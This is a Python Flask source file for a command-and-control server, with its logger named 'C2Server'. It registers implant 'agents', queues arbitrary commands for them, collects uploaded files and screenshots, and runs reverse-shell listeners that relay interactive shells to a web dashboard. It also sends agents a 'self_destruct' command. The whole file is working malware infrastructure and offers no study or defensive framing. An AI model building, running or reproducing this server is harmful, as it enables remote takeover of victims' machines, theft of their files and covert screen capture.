from flask import Flask, request, jsonify, send_from_directory, render_template, redirect
from flask_cors import CORS
from flask_socketio import SocketIO, emit, join_room
import os
import uuid
import threading
import socket
import logging
import select
import psutil
import platform
from datetime import datetime
from werkzeug.utils import secure_filename
import requests

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger('C2Server')

app = Flask(__name__)
CORS(app)
app.secret_key = os.urandom(24)
app.config['UPLOAD_FOLDER'] = 'uploads'
app.config['MAX_CONTENT_LENGTH'] = 16 * 1024 * 1024  # Max file size: 16MB
socketio = SocketIO(app, cors_allowed_origins="*", async_mode='threading')

agents = {}
tasks = {}
results = {}
shell_sessions = {}
session_lock = threading.Lock()

class ReverseShellSession:
    def __init__(self, conn, addr, port):
        self.conn = conn
        self.addr = addr
        self.port = port
        self.active = True
        self.conn.setblocking(0)
        self.lock = threading.Lock()
        logger.info(f"New shell session on port {port} from {addr}")

    def start(self):
        threading.Thread(target=self.handle_incoming_data, daemon=True).start()

    def handle_incoming_data(self):
        try:
            while self.active:
                r, _, _ = select.select([self.conn], [], [], 1)
                if self.conn in r:
                    data = self.conn.recv(4096)
                    if not data:
                        break
                    output = data.decode('utf-8', 'replace')
                    socketio.emit('shell_output', {
                        'port': self.port, 
                        'output': output
                    }, room=str(self.port))
        except Exception as e:
            logger.error(f"Shell error: {e}")
        finally:
            self.cleanup()

    def send_command(self, command):
        try:
            with self.lock:
                self.conn.send(command.encode() + b'\n')
        except Exception as e:
            logger.error(f"Error sending command: {e}")

    def cleanup(self):
        self.active = False
        self.conn.close()
        with session_lock:
            if self.port in shell_sessions:
                del shell_sessions[self.port]
        logger.info(f"Closed shell session on port {self.port}")

def reverse_shell_listener(port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(('0.0.0.0', port))
    s.listen(5)
    logger.info(f"Reverse shell listener started on port {port}")

    while True:
        conn, addr = s.accept()
        with session_lock:
            session = ReverseShellSession(conn, addr, port)
            shell_sessions[port] = session
            session.start()

@app.route('/results/<agent_id>', methods=['POST'])
def save_result(agent_id):
    data = request.json
    result_data = {
        'command': data.get('command', ''),
        'output': data.get('result', ''),
        'timestamp': data.get('timestamp', datetime.now().isoformat()),
        'type': data.get('type', 'command')
    }
    results.setdefault(agent_id, []).append(result_data)
    socketio.emit('command_result', {'agent_id': agent_id, 'result': result_data})
    return jsonify({'status': 'success'})

@app.route('/')
def index():
    return redirect('/dashboard')

@app.route('/delete_agent/<agent_id>', methods=['POST'])
def delete_agent(agent_id):
    if agent_id in agents:
        # Send delete command to agent first
        try:
            response = requests.post(
                f"http://{agents[agent_id]['ip']}/command/{agent_id}",
                json={'command': 'self_destruct'},
                timeout=10  # Timeout in seconds
            )
            if response.status_code == 200:
                logger.info(f"Self-destruct command sent successfully to agent {agent_id}")
            else:
                logger.warning(f"Failed to send self-destruct to agent {agent_id}: {response.status_code}")
        except requests.exceptions.Timeout:
            logger.error(f"Timeout while sending self-destruct command to agent {agent_id}")
        except Exception as e:
            logger.error(f"Error sending self-destruct command to agent {agent_id}: {e}")

        # Delete agent from the list
        del agents[agent_id]
        return redirect('/')
    return "Agent not found", 404
@app.route('/dashboard')
def dashboard():
    agents_data = {}
    for agent_id, agent in agents.items():
        screenshot_dir = os.path.join(app.config['UPLOAD_FOLDER'], agent_id)
        screenshots = []
        if os.path.exists(screenshot_dir):
            screenshots = [f for f in os.listdir(screenshot_dir) 
                          if f.lower().endswith(('.png', '.jpg', '.jpeg'))]
        agents_data[agent_id] = {**agent, 'screenshots': screenshots}
    return render_template('dashboard.html', agents=agents_data)

@app.route('/agent/<agent_id>')
def agent_details(agent_id):
    agent = agents.get(agent_id)
    if not agent:
        return "Agent not found", 404
    return render_template('agent.html',
                         agent_id=agent_id,
                         agent=agent,
                         results=reversed(results.get(agent_id, [])))

@app.route('/shell/<agent_id>/<int:port>')
def shell_session(agent_id, port):
    return render_template('shell.html', agent_id=agent_id, port=port)

@socketio.on('shell_command')
def handle_shell_command(data):
    port = data['port']
    command = data['command']
    if port in shell_sessions:
        shell_sessions[port].send_command(command)

@socketio.on('join')
def handle_join(data):
    join_room(str(data['port']))

@app.route('/register', methods=['POST'])
def register():
    try:
        agent_id = str(uuid.uuid4())[:8]
        agents[agent_id] = {
            'ip': request.remote_addr,
            'last_seen': datetime.now().isoformat(),
            'os': request.json.get('os', 'Unknown')
        }
        tasks[agent_id] = []
        results[agent_id] = []
        os.makedirs(f'uploads/{agent_id}', exist_ok=True)
        return jsonify({'id': agent_id})
    except Exception as e:
        logger.error(f"Registration failed: {e}")
        return jsonify({'error': 'Registration failed'}), 500

@app.route('/heartbeat/<agent_id>', methods=['POST'])
def heartbeat(agent_id):
    if agent_id not in agents:
        return jsonify({'error': 'Agent not found'}), 404
    
    agents[agent_id]['last_seen'] = datetime.now().isoformat()
    response = {'tasks': tasks.get(agent_id, [])}
    tasks[agent_id] = []
    return jsonify(response)

@app.route('/reverse-shell/<agent_id>', methods=['POST'])
def start_reverse_shell(agent_id):
    port = request.args.get('port', 4141, type=int)
    try:
        tasks[agent_id].append(f'reverse_shell:{port}')
        threading.Thread(target=reverse_shell_listener, args=(port,), daemon=True).start()
        return jsonify({'status': 'success', 'port': port})
    except Exception as e:
        logger.error(f"Failed to start reverse shell: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/upload/<agent_id>', methods=['POST'])
def upload_file(agent_id):
    if 'file' not in request.files:
        return jsonify({'error': 'No file part'}), 400
    
    file = request.files['file']
    if file.filename == '':
        return jsonify({'error': 'No selected file'}), 400
    
    filename = secure_filename(file.filename)
    file_path = os.path.join(app.config['UPLOAD_FOLDER'], agent_id, filename)
    try:
        file.save(file_path)
        return jsonify({'status': 'success', 'filename': filename})
    except Exception as e:
        logger.error(f"Failed to upload file: {e}")
        return jsonify({'error': 'File upload failed'}), 500

@app.route('/download/<agent_id>/<path:filename>', methods=['GET'])
def download_file(agent_id, filename):
    try:
        return send_from_directory(f'uploads/{agent_id}', filename, as_attachment=True)
    except FileNotFoundError:
        return jsonify({'error': 'File not found'}), 404

@app.route('/send-command', methods=['POST'])
def send_command():
    data = request.get_json()
    agent_id = data['agent_id']
    command = data['command']
    tasks.setdefault(agent_id, []).append(command)
    return jsonify({'status': 'success'})

@app.route('/screenshots/<agent_id>')
def view_screenshots(agent_id):
    screenshot_dir = os.path.join(app.config['UPLOAD_FOLDER'], agent_id)
    if not os.path.exists(screenshot_dir):
        return "No screenshots found", 404
    
    screenshots = [f for f in os.listdir(screenshot_dir) 
                  if f.lower().endswith(('.png', '.jpg', '.jpeg'))]
    return render_template('screenshots.html', 
                         agent_id=agent_id,
                         screenshots=screenshots)

@app.route('/uploads/<agent_id>/<filename>')
def serve_screenshot(agent_id, filename):
    return send_from_directory(os.path.join(app.config['UPLOAD_FOLDER'], agent_id), filename)


if __name__ == '__main__':
    os.makedirs(app.config['UPLOAD_FOLDER'], exist_ok=True)
    socketio.run(app, host='0.0.0.0', port=5000, debug=True)